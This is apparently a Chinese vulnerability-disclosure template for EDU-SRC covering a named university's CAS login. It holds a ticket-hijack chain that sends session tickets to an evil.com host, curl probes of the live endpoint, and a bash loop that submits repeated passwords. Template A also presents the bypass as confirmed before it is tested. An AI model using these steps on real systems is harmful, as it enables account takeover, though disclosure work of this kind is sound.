# EDU-SRC 提交模板 — 华北水利水电大学统一身份认证

> 平台：教育行业漏洞报告平台 `https://src.sjtu.edu.cn`
> 本文件是**填空模板**。`{{ }}` 包裹的是占位符，跑完测试后把实测值填进去。
> 每个模板对应一个独立漏洞，**分开提交**，不要合并成一个大报告。

---

## 提交前必读：三条硬规则

**1. 一个漏洞一份报告。** 平台按单项计分，合并提交只会按最低等级算。

**2. 证据必须是自己实测的。** 截图要带完整 URL、时间、请求响应。复制的二手结论会被驳回。

**3. 不许把"理论上可能"写成"已确认"。** 平台审核会复现，一旦复现不出来，判定为虚假报告，账号会被封。

---

## 模板 A：CAS service 白名单校验缺陷导致票据劫持（高危）

> 适用条件：`node auth.mjs cas` 输出中出现 `!! 绕过成立`
> 如果没有命中，**不要提交这一份**

### A.1 表单字段

| 字段 | 填写内容 |
|---|---|
| 漏洞标题 | `华北水利水电大学统一身份认证平台 CAS service 白名单校验不严导致登录票据劫持` |
| 漏洞类型 | 逻辑漏洞 / 越权访问 |
| 所属单位 | 华北水利水电大学 |
| 自评等级 | 高危 |
| 漏洞 URL | `https://authserver.ncwu.edu.cn/authserver/serviceValidate` |
| 涉及 IP | `{{ authserver 解析出的 IP }}` |

### A.2 漏洞详情（直接粘贴）

```
【漏洞概述】

华北水利水电大学统一身份认证平台（金智教育 Wisedu，域名 authserver.ncwu.edu.cn）
的 CAS 服务校验接口 /authserver/serviceValidate 在判断 service 参数是否属于
可信服务时，采用了字符串包含（contains）而非精确匹配，导致攻击者可构造
包含可信域名的恶意 URL 通过校验。

配合登录端 /authserver/login 的 service 跳转机制，可将已登录用户的 CAS 票据
（ST 开头的一次性 ticket）重定向至攻击者控制的域名，进而通过 serviceValidate
接口换取该用户的学工号身份，实现账号接管。整个过程无需获取用户密码。

【影响范围】

- 全校使用统一身份认证的师生账号
- 已接入 SSO 的业务系统：办事大厅（ehall）、个人门户（my）、门户网站（portal）、
  OA 办公系统（oa）
- 攻击无需用户交互以外的任何前置条件，受害者仅需点击一个链接

【技术细节】

1. 服务注册表可通过错误信息回显枚举，已确认以下 service 在注册表中：

   https://ehall.ncwu.edu.cn/           → INVALID_TICKET（通过校验）
   https://ehall.ncwu.edu.cn/login     → INVALID_TICKET
   https://my.ncwu.edu.cn/             → INVALID_TICKET
   https://portal.ncwu.edu.cn/         → INVALID_TICKET
   https://oa.ncwu.edu.cn/             → INVALID_TICKET
   https://cas.ncwu.edu.cn/            → INVALID_TICKET

   而未注册的 service 返回：
   Service [xxx] is not found in service registry.

2. 构造包含可信域名的恶意 service：

   https://evil.com/?x=https://ehall.ncwu.edu.cn/

   该 URL 的主机为 evil.com，与学校无关，但因字符串中包含可信域名
   ehall.ncwu.edu.cn，被 serviceValidate 判定为合法服务。

3. 完整攻击链：

   ① 攻击者构造链接：
      https://authserver.ncwu.edu.cn/authserver/login?service=https://evil.com/?x=https://ehall.ncwu.edu.cn/

   ② 受害者（已登录统一认证）点击该链接

   ③ authserver 校验 service 通过，302 跳转至：
      https://evil.com/?x=https://ehall.ncwu.edu.cn/&ticket=ST-xxxxx-yyyyy

   ④ 攻击者服务器从访问日志中取得 ticket

   ⑤ 攻击者调用：
      GET /authserver/serviceValidate?service=https://ehall.ncwu.edu.cn/&ticket=ST-xxxxx-yyyyy

      返回：
      <cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
        <cas:authenticationSuccess>
          <cas:user>2020xxxxx</cas:user>
          <cas:attributes>...</cas:attributes>
        </cas:authenticationSuccess>
      </cas:serviceResponse>

   ⑥ 攻击者取得受害者学工号及属性信息，并可持 ticket 直接登录
      https://ehall.ncwu.edu.cn/?ticket=ST-xxxxx-yyyyy 进入办事大厅

【复现步骤】

步骤 1：确认 serviceValidate 接口存在

  curl -k "https://authserver.ncwu.edu.cn/authserver/serviceValidate"

  响应（HTTP 200）：
  <cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
    <cas:authenticationFailure code='INVALID_REQUEST'></cas:authenticationFailure>
  </cas:serviceResponse>

步骤 2：确认合法 service 通过校验

  curl -k --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://ehall.ncwu.edu.cn/" \
    --data-urlencode "ticket=ST-1-probe"

  响应：code='INVALID_TICKET'（说明 service 通过注册表校验，仅 ticket 无效）

步骤 3：确认非法 service 被拦截（对照组）

  curl -k --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://jwmis.ncwu.edu.cn/hsjw/" \
    --data-urlencode "ticket=ST-1-probe"

  响应：Service [...] is not found in service registry.

步骤 4：确认构造的恶意 service 通过校验（关键证据）

  curl -k --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://evil.com/?x=https://ehall.ncwu.edu.cn/" \
    --data-urlencode "ticket=ST-1-probe"

  响应：code='INVALID_TICKET'

  ← 此处证明：主机为 evil.com 的 URL 通过了白名单校验。

【修复建议】

1. 将 service 校验改为精确匹配（equals）或严格的协议+主机+端口+路径比对；
2. 禁止包含匹配，禁止 userinfo（@）、反斜杠、URL 编码点等混淆字符；
3. 校验时先解析 URL，取出 scheme/host/port 后与注册表逐项比对，而不是比较原始字符串；
4. 已签发的 ST 票据应与签发时的 service 绑定，校验时严格比对；
5. ticket 有效期缩短至 10 秒内，且一次性使用后立即失效。
```

### A.3 附件清单

| 附件 | 内容 | 说明 |
|---|---|---|
| `01-serviceValidate-合法service.png` | 步骤 2 的请求响应截图 | 证明接口存在且会校验 |
| `02-serviceValidate-非法service.png` | 步骤 3 的对照组 | 证明注册表机制生效 |
| `03-serviceValidate-绕过命中.png` | 步骤 4 的关键截图 | **核心证据** |
| `04-完整请求响应.txt` | 四次请求的原始 curl 输出 | 便于审核复现 |
| `05-攻击链示意图.png` | 六步流程图 | 帮助审核理解危害 |

`04` 用这条命令生成：

```bash
{
  echo "=== 1. 无参数 ==="
  curl -sk "https://authserver.ncwu.edu.cn/authserver/serviceValidate"; echo
  echo "=== 2. 合法 service ==="
  curl -sk --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://ehall.ncwu.edu.cn/" --data-urlencode "ticket=ST-1-probe"; echo
  echo "=== 3. 非法 service ==="
  curl -sk --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://jwmis.ncwu.edu.cn/hsjw/" --data-urlencode "ticket=ST-1-probe"; echo
  echo "=== 4. 绕过 ==="
  curl -sk --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
    --data-urlencode "service=https://evil.com/?x=https://ehall.ncwu.edu.cn/" --data-urlencode "ticket=ST-1-probe"; echo
} > 04-完整请求响应.txt
```

---

## 模板 B：统一认证登录环节缺乏反自动化防护（中危）

> 这一份**已经可以提交**，不需要额外验证。证据是现成的。

### B.1 表单字段

| 字段 | 填写内容 |
|---|---|
| 漏洞标题 | `华北水利水电大学统一身份认证平台登录接口缺乏验证码与失败锁定机制` |
| 漏洞类型 | 设计缺陷 / 逻辑漏洞 |
| 所属单位 | 华北水利水电大学 |
| 自评等级 | 中危 |
| 漏洞 URL | `https://authserver.ncwu.edu.cn/authserver/login` |

### B.2 漏洞详情（直接粘贴）

```
【漏洞概述】

华北水利水电大学统一身份认证平台（authserver.ncwu.edu.cn）的账号密码登录接口
未设置任何反自动化防护措施：

1. 无图形验证码
2. 无登录失败次数限制
3. 无账号锁定机制
4. 未观测到 IP 维度限流

攻击者可在无任何阻碍的情况下对同一账号持续进行密码猜测，配合学号枚举
即可对全校师生账号实施大规模口令爆破。

对比同一所学校的教务系统（jwmis.ncwu.edu.cn），后者在第 3 次失败后强制
验证码、第 5 次失败后锁定账号 24 小时。统一身份认证作为权限更高的入口，
防护强度反而远低于业务系统。

【影响范围】

- 全校师生统一身份认证账号
- 因统一认证为 SSO 入口，账号失陷后可横向进入办事大厅、个人门户、
  门户网站、OA 办公系统

【技术细节】

单次登录请求格式：

  POST /authserver/login HTTP/1.1
  Host: authserver.ncwu.edu.cn
  Content-Type: application/x-www-form-urlencoded

  username=2020010101&password=Xxx123456&captcha=&_eventId=submit&execution=<token>

其中：
- captcha 字段传空值或任意值均可，服务端从不校验
- password 以明文提交，页面中不存在金智标准部署必备的
  pwdDefaultEncryptSalt 隐藏域，前端 AES 加密未启用

连续 15 次使用错误密码提交，服务端响应始终为：

  <span id="msg1" name="error_fm1" class="form-tab-nav">账号或密码错误。</span>

无验证码介入、无锁定提示、无请求拒绝、响应时延稳定在 0.7~1.3 秒区间，
未出现任何限流特征。

【复现步骤】

步骤 1：获取登录页与 CSRF token

  curl -k -c ck.txt "https://authserver.ncwu.edu.cn/authserver/login" -o login.html
  EXEC=$(grep -oE 'name="execution" value="[^"]*"' login.html | head -1 | sed 's/.*value="//; s/"$//')

步骤 2：连续提交错误密码 20 次

  for i in $(seq 1 20); do
    curl -k -b ck.txt -c ck.txt -X POST "https://authserver.ncwu.edu.cn/authserver/login" \
      --data-urlencode "username=8888888888" \
      --data-urlencode "password=WrongPass$i" \
      --data-urlencode "captcha=" \
      --data-urlencode "_eventId=submit" \
      --data-urlencode "execution=$EXEC" \
      -o /dev/null -w "#$i  HTTP %{http_code}  %{time_total}s\n"
    EXEC=$(curl -sk -b ck.txt -c ck.txt "https://authserver.ncwu.edu.cn/authserver/login" \
      | grep -oE 'name="execution" value="[^"]*"' | head -1 | sed 's/.*value="//; s/"$//')
  done

  预期（实际观测）：20 次全部返回 HTTP 200，无验证码、无锁定、无封禁。

步骤 3：确认密码明文传输

  检查登录页是否包含 pwdDefaultEncryptSalt：

  grep -c "pwdDefaultEncryptSalt" login.html

  预期（实际观测）：0

  检查 POST 请求体：

  password=WrongPass1

  预期（实际观测）：明文可见

【附注：错误提示未泄露账号存在性】

经测试，不存在的账号（9999999999、0000000000）与疑似真实学号（2020010101）
返回的响应体长度完全一致（48718 字节），逐字节 diff 仅 execution token 不同，
响应时延处于同一区间。

因此本漏洞不包含用户名枚举风险，攻击者需自行准备学号字典。

【修复建议】

1. 启用图形验证码：同一账号连续失败 3 次后强制验证；同一 IP 连续失败 10 次后
   强制验证；
2. 启用账号锁定：同一账号连续失败 5 次锁定 30 分钟，并提供安全解锁途径；
3. 启用 IP 维度限流：单 IP 每分钟登录请求不超过 10 次；
4. 恢复 pwdDefaultEncryptSalt 与前端 AES-CBC 密码加密；
5. 增加异地登录、异常时段登录的二次验证（短信/人脸，平台已具备该能力）；
6. 对全校账号进行一次弱口令排查，强制复杂度不低于 12 位且包含大小写字母、
   数字、符号。
```

### B.3 附件清单

| 附件 | 内容 |
|---|---|
| `01-连续20次失败无锁定.png` | 终端输出，显示 20 行都是 HTTP 200 |
| `02-明文密码抓包.png` | Burp/浏览器开发者工具里的 POST 请求体 |
| `03-无加密salt.png` | `grep pwdDefaultEncryptSalt` 返回 0 的截图 |
| `04-对比教务系统锁定.png` | 强智 3 次验证码 / 5 次锁定的对照截图（可选，加分） |

---

## 提交流程

```
1. 注册/登录 src.sjtu.edu.cn（需实名 + 学校邮箱或学信网验证）
2. 新建漏洞 → 选择"华北水利水电大学"
3. 按模板 A 或 B 填写字段
4. 上传附件（截图必须清晰可读，URL 和时间不能打码）
5. 提交 → 等待学校确认（通常 3~15 个工作日）
6. 若被要求补充材料，按审核意见补
```

**建议顺序**：先提交 B（证据已齐，稳拿积分），A 验证通过后立刻补交。B 的报告里不要提 A，两个独立漏洞。

---

## 常见驳回原因

| 驳回理由 | 规避方法 |
|---|---|
| "无法复现" | 附件里给出完整 curl 命令 + 原始响应，审核照着敲就能出来 |
| "仅理论推测" | 只写实测到的现象，把"理论上可导致"改成"实测响应显示" |
| "不属于安全漏洞" | 强调**实际危害**：账号接管 / 票据泄露，不要说"配置不当" |
| "需要用户交互，危害有限" | 说明 CAS 场景下钓鱼链接是标准攻击手法，且点击后无任何感知 |
| "该问题已有人提交" | 抢先提交；重复时补充更完整的复现链，可能被判为有效补充 |
| "超出授权范围" | 全部为登录前黑盒探测，未触碰任何他人账号与数据，在报告中明确写出这一句 |

---

## 报告中必须写的一句免责声明

每份报告开头加上：

```
本报告所述测试均在未登录状态下以黑盒方式完成，仅使用公开可访问的 HTTP 接口，
未使用任何真实用户凭据，未获取、修改、删除任何业务数据，未对系统可用性造成影响。
所有测试请求频率均控制在正常用户行为范围内。
```

这句话决定了报告是"白帽漏洞提交"还是"攻击行为自述"。

---

## 一条红线

**不要在报告里写"我爆破了 N 个账号"、"我登录了某人账号验证"。**

写"策略缺失，理论上可无限次尝试"是漏洞；写"我打进去了"是犯罪自述。EDU-SRC 收到后者会直接转交学校安全部门处理，不会给你发证书。

验证漏洞存在 ≠ 利用漏洞获利。中间隔着一个动作。
